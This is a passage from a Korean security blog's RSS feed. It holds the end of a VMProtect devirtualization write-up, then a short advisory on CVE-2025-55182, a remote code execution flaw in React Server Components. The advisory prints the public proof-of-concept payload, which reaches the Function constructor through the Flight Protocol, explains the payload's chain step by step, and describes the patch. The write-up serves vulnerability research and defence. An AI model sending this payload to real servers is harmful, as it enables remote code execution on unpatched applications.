&#xBBF8;&#xB9AC; &#xC7A1;&#xC544;&#xB454; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC774; &#xBC84;&#xD37C;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xB36E;&#xC5B4;&#xC50C;&#xC6B0;&#xB3C4;&#xB85D; &#xB3D9;&#xC791;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image22.png" alt></p><p>&#xAE34; &#xC5EC;&#xC815;&#xC758; &#xB05D;&#xC774; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.. VMProtect Devirtualization &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBCF5;&#xC6D0;&#xB41C; &#xC2E4;&#xC81C; x86 &#xCF54;&#xB4DC;(Devirtualized code)&#xAC00; &#xCD9C;&#xB825;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774; &#xCF54;&#xB4DC;&#xB294; &#xC55E;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; x86 &#xD568;&#xC218;&#xC774;&#xBA70;, &#xD328;&#xCE58; &#xD6C4; IDA&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC601;&#xC5ED;&#xC744; &#xBCF4;&#xBA74; &#xB09C;&#xB3C5;&#xD654;&#xB41C; VMP &#xCF54;&#xB4DC; &#xB300;&#xC2E0; &#xC704;&#xC640; &#xAC19;&#xC740; &#xAE54;&#xB054;&#xD55C; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xAC00; &#xC790;&#xB9AC;&#xC7A1;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image23.png" alt></p><p>&#xD328;&#xCE58; &#xD6C4; &#xBE44;&#xAD50;&#xB97C; &#xC704;&#xD574; <code>.vmp0</code> &#xC601;&#xC5ED;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC744; &#xBE44;&#xAD50;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xD328;&#xCE58; &#xC804; &#xCF54;&#xB4DC;&#xC5D0;&#xB294; VMP &#xC804;&#xC6A9; &#xC139;&#xC158;&#xC5D0; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xC5F0;&#xC0B0;&#xACFC; &#xC810;&#xD504;&#xAC00; &#xC5BD;&#xD600; &#xC788;&#xB294; &#xB09C;&#xB3C5;&#xD654; &#xCF54;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image24.png" alt></p><p>&#xD328;&#xCE58; &#xD6C4;&#xC5D0;&#xB294; &#xB3D9;&#xC77C; &#xC704;&#xCE58;&#xC5D0; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xAEBC;&#xB0B4; <code>AND</code>/<code>SHR</code>/<code>SHL</code> &#xD558;&#xB294; &#xD3C9;&#xBC94;&#xD55C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; x86 &#xD568;&#xC218;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74;, &#xB354; &#xC774;&#xC0C1; VMProtect &#xC5D4;&#xC9C4;&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xACE0; &#xBCF5;&#xC6D0;&#xB41C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xD568;&#xC218;&#xB85C; &#xBC14;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5B4;, P&#xB97C; &#xB20C;&#xB800;&#xC744; &#xB54C; &#xAC00;&#xC0C1;&#xD654; &#xD568;&#xC218;&#xAC00; &#xB3D9;&#xC791;&#xD588;&#xB358; &#xC6D0;&#xB798;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xBA54;&#xC138;&#xC9C0; &#xBC15;&#xC2A4;&#xAC00; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;!  </p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;-&#xAC00;&#xC0C1;&#xD654;-&#xD574;&#xC81C;-&#xC131;&#xACF5;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;-&#xAC00;&#xC0C1;&#xD654;-&#xD574;&#xC81C;-&#xC131;&#xACF5;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;: &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C; &#xC131;&#xACF5;"></a>&#xB9C8;&#xBB34;&#xB9AC;: &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C; &#xC131;&#xACF5;</h2><p><img src="/2025/12/11/banda/VMPpart2/ko/image25.png" alt></p><p>&#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xC5D0; &#xC131;&#xACF5;&#xD55C; &#xCEA1;&#xCC98;&#xB97C; &#xC62C;&#xB9AC;&#xBA70; &#xAE00;&#xC744; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1;&#xD654;&#xB41C; &#xB300;&#xC0C1; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; <code>vir_Entry</code>&#xB97C; &#xD328;&#xCE58;&#xD574;, VMP &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xB300;&#xC2E0; &#xAD6C;&#xD604;&#xD55C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC; &#xBE14;&#xB85D;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xBD84;&#xAE30;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798;&#xB294; 2&#xD3B8;&#xAE4C;&#xC9C0; &#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;, &#xBB54;&#xAC00; &#xB354; &#xC5B4;&#xB824;&#xC6B4; &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C; &#xBB38;&#xC81C;&#xB3C4; unpack &#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB124;&#xC694;..  &#xB610;&#xD55C; &#xC774;&#xBC88; part 2&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA70; LLVM&#xACFC; &#xACB0;&#xD569;&#xD574; &#xBCF5;&#xC7A1;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC5B4;&#xB290; &#xC218;&#xC900;&#xAE4C;&#xC9C0; &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC744;&#xC9C0;&#xB3C4; &#xACE0;&#xBBFC;&#xD574;&#xBCF4;&#xC558;&#xACE0;, &#xB9CC;&#xC57D; &#xC774;&#xC5B4;&#xC11C; &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xC4F4;&#xB2E4;&#xBA74; &#xC544;&#xB9C8; &#xC774; &#xC8FC;&#xC81C;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>&#xC800;&#xC640; &#xD568;&#xAED8; &#xB09C;&#xB3C5;&#xD654; &#xD574;&#xC81C;&#xC758; &#xC5EC;&#xC815;&#xC744; &#xD568;&#xAED8; &#xD574;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.&#x1F601;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252">https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252</a></li><li><a href="https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/">https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/</a></li><li><a href="https://whereisr0da.github.io/blog/posts/2021-01-05-vmp-1/">https://whereisr0da.github.io/blog/posts/2021-01-05-vmp-1/</a></li><li><a href="https://secret.club/2021/09/08/vmprotect-llvm-lifting-1.html">https://secret.club/2021/09/08/vmprotect-llvm-lifting-1.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/VMProtect/">VMProtect</category>
      
      <category domain="https://hackyboiz.github.io/tags/Pin/">Pin</category>
      
      <category domain="https://hackyboiz.github.io/tags/Triton/">Triton</category>
      
      <category domain="https://hackyboiz.github.io/tags/devirtualize/">devirtualize</category>
      
      <category domain="https://hackyboiz.github.io/tags/unpack/">unpack</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-55182: React Server Component의 Flight Protocol 입력 검증 미흡으로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/10/millet/cve-2025-55182/</link>
      <guid>https://hackyboiz.github.io/2025/12/10/millet/cve-2025-55182/</guid>
      <pubDate>Wed, 10 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://react2shell.com/&quot;&gt;https://react2shell.com/&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://react2shell.com/">https://react2shell.com/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>react-server-dom-weback 19.0.0, 19.1.0, 19.1.1, 19.2.0</li><li>react-server-dom-parcel 19.0.0, 19.1.0, 19.1.1, 19.2.0</li><li>react-server-dom-turbopack 19.0.0, 19.1.0, 19.1.1, 19.2.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>React Server Component&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xB80C;&#xB354;&#xB9C1; &#xC131;&#xB2A5;&#xC744; &#xAC1C;&#xC120;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB3C4;&#xC785;&#xB41C; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xACB0;&#xACFC;&#xB97C; Flight Protocol&#xC774;&#xB77C;&#xB294; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC9C1;&#xB82C;&#xD654;&#xD558;&#xC5EC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; &#xC804;&#xC1A1;&#xD574; UI&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C;&#xB294; &#xC644;&#xC804;&#xD55C; HTML &#xBB38;&#xC11C;&#xB97C; &#xAE30;&#xB2E4;&#xB9AC;&#xB294; &#xB300;&#xC2E0; HTML &#xC2A4;&#xCF08;&#xB808;&#xD1A4;&#xACFC; &#xCCAD;&#xD06C; &#xB2E8;&#xC704;&#xC758; RSC Payload&#xB97C; &#xBC1B;&#xC544; &#xC870;&#xB9BD;&#xD558;&#xC5EC; &#xB80C;&#xB354;&#xB9C1;&#xC744; &#xC644;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC11C;&#xBC84;&#xB294; <code>props</code>, <code>placeholder</code>, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xBAA8;&#xB4C8; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC9C1;&#xB82C;&#xD654; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xBA70; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC5ED;&#xC2DC; &#xC11C;&#xBC84; &#xC561;&#xC158; &#xD638;&#xCD9C; &#xC2DC; flight &#xD615;&#xC2DD;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Flight Protocol&#xC758; RSC Payload &#xAD6C;&#xC870;&#xC758; &#xC608;&#xC2DC;</p></blockquote><pre><code class="hljs json">{<span class="hljs-attr">&quot;0&quot;</span>: [<span class="hljs-string">&quot;div&quot;</span>, { <span class="hljs-attr">&quot;children&quot;</span>: <span class="hljs-string">&quot;Hello&quot;</span> }],<span class="hljs-attr">&quot;1&quot;</span>: [<span class="hljs-string">&quot;ClientComponent&quot;</span>,{<span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-attr">&quot;props&quot;</span>: { <span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;hello&quot;</span> }}]}</code></pre><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC11C;&#xBC84;&#xB294; RSC Payload &#xB0B4;&#xBD80;&#xC758; &#xC11C;&#xBC84; &#xC561;&#xC158;&#xC744; &#xD568;&#xC218; &#xD615;&#xD0DC;&#xB85C; &#xB85C;&#xB529;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Next.js 13&#xBC84;&#xC804;&#xBD80;&#xD130; &#xC774;&#xB7EC;&#xD55C; &#xC11C;&#xBC84; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xAE30;&#xBCF8;&#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>Flight Protocol&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; RSC Payload&#xB294; HTTP &#xC694;&#xCCAD; &#xBC14;&#xB514;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xB294; &#xC9C1;&#xB82C;&#xD654; &#xB370;&#xC774;&#xD130;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC9C1;&#xC811; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC11C;&#xBC84; &#xCE21; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC804;&#xC1A1;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xBCC4;&#xB3C4;&#xC758; &#xC18D;&#xC131; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xAC1D;&#xCCB4; &#xC811;&#xADFC;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>constructor</code>, <code>__proto__</code>&#xB4F1;&#xC758; &#xC704;&#xD5D8;&#xD55C; &#xD0A4; &#xAC12;&#xC744; &#xC8FC;&#xC785;&#xD560; &#xACBD;&#xC6B0; Prototype Pollution&#xC774;&#xB098; &#xD568;&#xC218; &#xC0DD;&#xC131;&#xC790;&#xB85C; &#xD574;&#xC11D;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC11C;&#xBC84;&#xC5D0; Flight Protocol &#xD615;&#xC2DD;&#xC744; &#xB530;&#xB974;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xACBD;&#xC6B0; &#xC11C;&#xBC84;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>react/packages/react-server/src/ReactFlightReplyServer.js</strong></p></blockquote><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getOutlinedModel</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">  response: Response,</span></span><span class="hljs-function"><span class="hljs-params">  reference: string,</span></span><span class="hljs-function"><span class="hljs-params">  parentObject: Object,</span></span><span class="hljs-function"><span class="hljs-params">  key: string,</span></span><span class="hljs-function"><span class="hljs-params">  map: (response: Response, model: any) =&gt; T,</span></span><span class="hljs-function"><span class="hljs-params"></span>): <span class="hljs-title">T</span> </span>{  <span class="hljs-keyword">const</span> path = reference.split(<span class="hljs-string">&apos;:&apos;</span>);  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);  <span class="hljs-keyword">const</span> chunk = getChunk(response, id);  <span class="hljs-keyword">switch</span> (chunk.status) {    <span class="hljs-keyword">case</span> RESOLVED_MODEL:      initializeModelChunk(chunk);      <span class="hljs-keyword">break</span>;  }  <span class="hljs-comment">// The status might have changed after initialization.</span>  <span class="hljs-keyword">switch</span> (chunk.status) {    <span class="hljs-keyword">case</span> INITIALIZED:      <span class="hljs-keyword">let</span> value = chunk.value;      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.length; i++) {        value = value[path[i]]; <span class="hljs-comment">//[1]</span>      }...</code></pre><p>&#xC774;&#xB54C; &#xCCAD;&#xD06C;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; <code>INITIALIZED</code>&#xC77C; &#xACBD;&#xC6B0;, [1]&#xACFC; &#xAC19;&#xC774; RSC Payload&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628;<code>path</code>&#xB4E4;&#xC744; &#xD0A4;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC801;&#xC808;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>path</code> &#xAC12;&#xC774; <code>__proto__</code>&#xB098; <code>constructor</code>&#xC77C; &#xACBD;&#xC6B0; <code>object.__proto__</code>&#xC640; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xD55C; &#xC18D;&#xC131;&#xC5D0; &#xB300;&#xD55C; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. </p><p>RSC&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC9C1;&#xC811;&#xC801;&#xC778; RCE&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVSS 10.0&#xC744; &#xBC1B;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC790;&#xBC14;&#xC758; &#xB85C;&#xAE45; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC778; Log4j&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC778; <a href="https://www.ibm.com/kr-ko/think/topics/log4shell">Log4Shell</a>&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC810;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>&#xACF5;&#xAC1C;&#xB41C; PoC &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> payload = {    <span class="hljs-string">&apos;0&apos;</span>: <span class="hljs-string">&apos;$1&apos;</span>,                                                           <span class="hljs-string">&apos;1&apos;</span>: {                                                                   <span class="hljs-string">&apos;status&apos;</span>:<span class="hljs-string">&apos;resolved_model&apos;</span>,        <span class="hljs-string">&apos;reason&apos;</span>:<span class="hljs-number">0</span>,        <span class="hljs-string">&apos;_response&apos;</span>:<span class="hljs-string">&apos;$4&apos;</span>,        <span class="hljs-string">&apos;value&apos;</span>:<span class="hljs-string">&apos;{&quot;then&quot;:&quot;$3:map&quot;,&quot;0&quot;:{&quot;then&quot;:&quot;$B3&quot;},&quot;length&quot;:1}&apos;</span>,        <span class="hljs-string">&apos;then&apos;</span>:<span class="hljs-string">&apos;$2:then&apos;</span>    },    <span class="hljs-string">&apos;2&apos;</span>: <span class="hljs-string">&apos;$@3&apos;</span>,                                                                <span class="hljs-string">&apos;3&apos;</span>: [],    <span class="hljs-string">&apos;4&apos;</span>: {        <span class="hljs-string">&apos;_prefix&apos;</span>:<span class="hljs-string">&apos;console.log(7*7+1)//&apos;</span>,        <span class="hljs-string">&apos;_formData&apos;</span>:{            <span class="hljs-string">&apos;get&apos;</span>:<span class="hljs-string">&apos;$3:constructor:constructor&apos;</span>        },        <span class="hljs-string">&apos;_chunks&apos;</span>:<span class="hljs-string">&apos;$2:_response:_chunks&apos;</span>,    }}</code></pre><p>&#xAC01; &#xC22B;&#xC790; &#xD0A4;&#xB294; Flight Payload &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCCAD;&#xD06C;&#xB85C; &#xD574;&#xC11D;&#xB418;&#xBA70; <code>$</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAC12;&#xB4E4;&#xC740; &#xB2E4;&#xB978; &#xCCAD;&#xD06C;&#xB098; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xD1A0;&#xD070;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xB429;&#xB2C8;&#xB2E4;. &#xAC01; &#xCCAD;&#xD06C;&#xC758; &#xD574;&#xC11D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>0&#xBC88; &#xCCAD;&#xD06C;&#xAC00; 1&#xBC88; &#xCCAD;&#xD06C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xAC00; 1&#xBC88; &#xCCAD;&#xD06C;&#xB97C; &#xC2E4;&#xC81C; &#xBAA8;&#xB378;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;</li><li><code>resolved_model</code> &#xC0C1;&#xD0DC;&#xB97C; &#xD1B5;&#xD574; &#xCCAD;&#xD06C;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD558;&#xBA70; <code>$4</code> &#xCCAD;&#xD06C;&#xB97C; &#xD574;&#xB2F9; &#xBAA8;&#xB378;&#xC758; &#xC751;&#xB2F5; &#xAC1D;&#xCCB4;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC2DC;. &#xC774;&#xD6C4; <code>$2</code> &#xCCAD;&#xD06C;&#xC758; <code>then</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xC5B4; &#xC5F0;&#xACB0;</li><li><code>$3</code> &#xCCAD;&#xD06C;&#xB97C; Promise&#xCC98;&#xB7FC; &#xD574;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC2DC;</li><li>&#xBC30;&#xC5F4;&#xC758; &#xC0DD;&#xC131;&#xC790;&#xB294; <code>Array</code>, <code>Array</code>&#xC758; &#xC0DD;&#xC131;&#xC790;&#xB294; <code>Function</code>&#xC774;&#xBBC0;&#xB85C; <code>$3:constructor:constructor</code>&#xC640; &#xAC19;&#xC740; &#xCC38;&#xC870; &#xCCB4;&#xC778;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xD568;&#xC218; &#xC0DD;&#xC131;&#xC790;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC2DC;</li><li>&#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xD568;&#xC218; &#xBCF8;&#xBB38;&#xC744; &#xC0BD;&#xC785;</li></ol><p>root cause&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB4EF;&#xC774; <code>path</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>value</code>&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Prototype Pollution&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218; &#xBCF8;&#xBB38;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD558;&#xB294; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>&#xD328;&#xCE58; &#xCEE4;&#xBC0B; <code>7dc903cd29dac55efb4424853fd0442fef3a8700</code>&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC38;&#xC870;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC774;&#xC804;&#xC5D0; &#xB300;&#xC0C1; &#xAC1D;&#xCCB4;&#xC758; &#xC9C1;&#xC811; &#xC18D;&#xC131;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785; &#xCCB4;&#xC778;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xB418;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/10/millet/cve-2025-55182/1.png" alt></p><p><img src="/2025/12/10/millet/cve-2025-55182/2.png" alt></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a 